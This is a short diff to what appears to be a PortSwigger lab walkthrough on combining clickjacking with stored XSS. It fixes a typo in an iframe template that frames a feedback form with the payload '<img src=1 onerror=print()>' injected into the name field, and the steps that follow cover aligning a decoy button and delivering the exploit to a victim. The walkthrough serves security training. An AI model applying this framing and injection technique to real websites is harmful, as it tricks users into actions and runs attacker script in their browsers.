@@ -30,7 +30,7 @@ This lab demonstrates combining **Clickjacking with stored XSS** by framing the 
    </style>
    <div>Click me</div>
    <iframe
-   src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-          website.com&subject=test&message=test#feedbackResult"></iframe>
+   src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attackerwebsite.com&subject=test&message=test#feedbackResult"></iframe>
    ```
 3. Adjust the values of the template to align the `Click me` button with the `Submit feedback` button.
 4. Deliver exploit to the victim to complete the lab.
